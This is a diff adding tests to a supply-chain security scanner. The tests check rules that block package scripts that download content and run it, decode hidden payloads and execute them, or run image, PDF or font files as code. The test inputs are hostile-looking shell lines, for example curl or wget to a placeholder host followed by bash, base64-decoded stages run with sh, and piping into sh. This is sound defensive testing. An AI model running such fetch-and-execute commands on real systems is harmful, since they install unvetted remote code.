@@ -43,6 +43,305 @@ def test_eval_network_decode_combo_is_blocking():
     assert combo.blocks_installation is True
 
 
+def test_remote_stage_download_then_interpreter_execution_is_blocked():
+    findings = analyze_text(
+        "prepare() {\n"
+        "  curl --fail https://example.invalid/fixture -o /tmp/fixture-stage\n"
+        "  command bash /tmp/fixture-stage\n"
+        "}\n"
+    )
+
+    staged = finding(findings, "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001")
+    assert staged.severity == Severity.CRITICAL
+    assert staged.blocks_installation is True
+    assert staged.line_number == 2
+    assert staged.evidence_snippet == (
+        "Correlated signals: remote content is written to a local artifact; "
+        "the acquired artifact or its derived content is executed"
+    )
+    assert "example.invalid" not in staged.evidence_snippet
+    assert "/tmp/fixture-stage" not in staged.evidence_snippet
+
+
+def test_remote_stage_supports_constants_wget_git_and_direct_execution():
+    constant = analyze_text(
+        "fixture_url='https://example.invalid/fixture'\n"
+        "fixture_path='./fixture-stage'\n"
+        'wget --output-document="$fixture_path" "$fixture_url"\n'
+        '"$fixture_path"\n'
+    )
+    cloned = analyze_text(
+        "git clone --depth 1 https://example.invalid/fixture.git fixture-tree\n"
+        "env -i bash fixture-tree/bootstrap.sh\n"
+    )
+
+    assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" in rule_ids(constant)
+    assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" in rule_ids(cloned)
+
+
+def test_remote_stage_tracks_constant_path_suffixes_and_pipeline_writers():
+    cases = (
+        (
+            "fixture_dir=/tmp\n"
+            "curl https://example.invalid/fixture -o \"$fixture_dir/stage\"\n"
+            "bash /tmp/stage\n"
+        ),
+        (
+            "curl https://example.invalid/fixture | "
+            "tee /tmp/fixture-stage >/dev/null\n"
+            "bash /tmp/fixture-stage\n"
+        ),
+        (
+            "curl https://example.invalid/fixture | "
+            "base64 --decode > fixture-stage\n"
+            "sh fixture-stage\n"
+        ),
+        (
+            "curl https://example.invalid/fixture | cat | "
+            "tee /tmp/fixture-stage >/dev/null\n"
+            "bash /tmp/fixture-stage\n"
+        ),
+        (
+            "curl https://example.invalid/fixture | tr -d '\\n' | "
+            "tee /tmp/fixture-stage >/dev/null\n"
+            "bash /tmp/fixture-stage\n"
+        ),
+        (
+            "curl https://example.invalid/fixture | cat > fixture-stage\n"
+            "sh fixture-stage\n"
+        ),
+        (
+            "curl https://example.invalid/fixture | "
+            "cat /dev/stdin > fixture-stage\n"
+            "sh fixture-stage\n"
+        ),
+        (
+            "curl https://example.invalid/fixture -o artwork.png\n"
+            "python3 -W ignore artwork.png\n"
+        ),
+        (
+            "curl https://example.invalid/fixture -o fixture-stage\n"
+            "bash<fixture-stage\n"
+        ),
+        (
+            "curl https://example.invalid/fixture -o fixture-stage\n"
+            "bash 0<fixture-stage\n"
+        ),
+    )
+
+    for content in cases:
+        staged = finding(
+            analyze_text(content),
+            "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001",
+        )
+        assert staged.severity == Severity.CRITICAL
+        assert staged.blocks_installation is True
+
+
+def test_remote_stage_detects_downloaded_carrier_decoded_before_execution():
+    findings = analyze_text(
+        "curl https://example.invalid/fixture.png -o fixture.png\n"
+        "base64 --decode fixture.png > fixture-stage.sh\n"
+        "sh fixture-stage.sh\n"
+    )
+
+    staged = finding(findings, "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001")
+    assert "downloaded content is decoded or copied into another artifact" in staged.evidence_snippet
+    assert staged.line_number == 1
+    assert "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001" not in rule_ids(findings)
+
+
+def test_remote_stage_rule_ignores_inert_or_incomplete_correlations():
+    cases = (
+        "# curl https://example.invalid/fixture -o stage; bash stage\n",
+        "echo 'curl https://example.invalid/fixture -o stage; bash stage'\n",
+        "docs=(curl https://example.invalid/fixture -o stage bash stage)\n",
+        "curl https://example.invalid/fixture -o stage\n",
+        "bash stage\n",
+        "curl https://example.invalid/fixture -o first\nbash second\n",
+        "curl https://example.invalid/fixture -o stage\ninstall -Dm755 stage \"$pkgdir/usr/bin/demo\"\n",
+        "source=('https://example.invalid/fixture')\n./fixture\n",
+        "curl https://example.invalid/fixture | fixture-filter > stage\n",
+    )
+
+    for content in cases:
+        assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" not in rule_ids(analyze_text(content))
+
+
+def test_remote_stage_ambiguous_or_streamed_execution_fails_closed():
+    cases = (
+        "curl https://example.invalid/fixture | cat | sh\n",
+        (
+            "curl https://example.invalid/fixture | "
+            "fixture-filter > fixture-stage\n"
+            "sh fixture-stage\n"
+        ),
+        (
+            "curl https://example.invalid/fixture | cat | "
+            "fixture-filter | tee fixture-stage\n"
+            "sh fixture-stage\n"
+        ),
+    )
+
+    for content in cases:
+        findings = analyze_text(content)
+        incomplete = finding(
+            findings,
+            "STATIC-REMOTE-STAGE-INSPECTION-INCOMPLETE-001",
+        )
+        assert incomplete.severity == Severity.HIGH
+        assert incomplete.blocks_installation is True
+        assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" not in rule_ids(findings)
+
+
+def test_remote_stage_correlation_invalidates_definite_overwrites_and_relative_cwd_changes():
+    cases = (
+        "curl https://example.invalid/fixture -o stage\nprintf benign > stage\nsh stage\n",
+        "curl https://example.invalid/fixture -o stage\ncp benign stage\nsh stage\n",
+        "curl https://example.invalid/fixture -o stage\nrm stage\nsh stage\n",
+        "curl https://example.invalid/fixture -o stage\ncd /tmp\nsh stage\n",
+    )
+
+    for content in cases:
+        findings = analyze_text(content)
+        assert "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001" not in rule_ids(findings)
+
+
+def test_remote_stage_parser_and_command_bounds_fail_closed():
+    for content in (
+        "true;" * 16385,
+        "printf 'unterminated\n",
+    ):
+        findings = analyze_text(content)
+        incomplete = finding(
+            findings,
+            "STATIC-REMOTE-STAGE-INSPECTION-INCOMPLETE-001",
+        )
+        assert incomplete.severity == Severity.HIGH
+        assert incomplete.blocks_installation is True
+
+
+def test_remote_stage_rule_applies_to_declared_install_hook_phase():
+    findings = analyze_text(
+        "post_install() {\n"
+        "  wget https://example.invalid/fixture -O /tmp/fixture-stage\n"
+        "  /usr/bin/python3 /tmp/fixture-stage\n"
+        "}\n",
+        Phase.install_hook_static,
+    )
+
+    staged = finding(findings, "SUPPLYCHAIN-REMOTE-STAGE-EXEC-001")
+    assert staged.phase == Phase.install_hook_static
+    assert staged.blocks_installation is True
+
+
+def test_local_decode_then_execution_is_blocked_for_supported_carriers():
+    cases = (
+        (
+            "base64 --decode fixture.txt > fixture-stage\n"
+            "bash fixture-stage\n"
+        ),
+        (
+            "xxd -r fixture.png fixture-stage\n"
+            "command ./fixture-stage\n"
+        ),
+        (
+            "openssl enc -d -in fixture.pdf -out fixture-stage\n"
+            "python3 fixture-stage\n"
+        ),
+        (
+            "stage=fixture-stage\n"
+            "base64 -d fixture.txt > \"$stage\"\n"
+            "sh \"$stage\"\n"
+        ),
+        (
+            "base64 -d fixture.txt>fixture-stage\n"
+            "dash fixture-stage\n"
+        ),
+    )
+
+    for content in cases:
+        findings = analyze_text(content)
+        carrier = finding(findings, "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001")
+        assert carrier.severity == Severity.CRITICAL
+        assert carrier.blocks_installation is True
+        assert carrier.evidence_snippet == (
+            "Correlated signals: local content is decoded into a separate artifact; "
+            "the decoded artifact is subsequently executed"
+        )
+        assert "fixture" not in carrier.evidence_snippet
+
+
+def test_media_document_or_font_named_code_execution_is_blocked():
+    cases = (
+        "bash artwork.png\n",
+        "bash < artwork.png\n",
+        "bash<artwork.png\n",
+        "bash 0<artwork.png\n",
+        "./guide.pdf\n",
+        "command assets/typeface.woff2\n",
+        "carrier=recording.mp3\npython3 \"$carrier\"\n",
+        "python3 -W ignore artwork.png\n",
+        "php8.3 notes.txt\n",
+        "lua5.4 metadata.json\n",
+        "sh notes.txt\n",
+        "node metadata.json\n",
+    )
+
+    for content in cases:
+        carrier = finding(
+            analyze_text(content),
+            "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001",
+        )
+        assert carrier.blocks_installation is True
+        assert carrier.evidence_snippet == (
+            "Correlated signals: a media, document, or font-named artifact is supplied for execution; "
+            "the carrier-named artifact is invoked as code"
+        )
+        assert not any(
+            name in carrier.evidence_snippet
+            for name in ("artwork", "guide", "typeface", "recording", "notes", "metadata")
+        )
+
+
+def test_opaque_carrier_rule_applies_to_install_hook():
+    carrier = finding(
+        analyze_text(
+            "post_install() {\n  /usr/bin/bash /usr/share/demo/banner.svg\n}\n",
+            Phase.install_hook_static,
+        ),
+        "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001",
+    )
+
+    assert carrier.phase == Phase.install_hook_static
+    assert carrier.blocks_installation is True
+    assert carrier.line_number == 2
+
+
+def test_opaque_carrier_rule_ignores_inert_assets_and_normal_scripts():
+    cases = (
+        "# bash artwork.png\n",
+        "printf '%s\\n' 'bash artwork.png'\n",
+        "docs=(base64 -d artwork.png '>' stage bash stage)\n",
+        "source=('https://example.invalid/artwork.png')\n",
+        "base64 -d artwork.png > fixture-stage\n",
+        "base64 -d artwork.png > fixture-stage\nprintf benign > fixture-stage\nsh fixture-stage\n",
+        "install -Dm644 artwork.png \"$pkgdir/usr/share/demo/artwork.png\"\n",
+        "convert artwork.png thumbnail.webp\n",
+        "xdg-open guide.pdf\n",
+        "bash build.sh\npython3 setup.py\nnode task.js\n",
+        "bash build.sh < artwork.png\n",
+        "python3 build.py artwork.png\n",
+        "python3 -c 'print(1)' guide.pdf\n",
+        "openssl enc -in fixture.txt -out encrypted.bin\n./encrypted.bin\n",
+    )
+
+    for content in cases:
+        assert "SUPPLYCHAIN-OPAQUE-CARRIER-EXEC-001" not in rule_ids(
+            analyze_text(content)
+        )
+
+
 def test_systemd_service_file_install_is_lower_severity_than_auto_enable():
     findings = analyze_text('package() {\n  install -Dm644 demo.service "$pkgdir/usr/lib/systemd/system/demo.service"\n}\n')
 
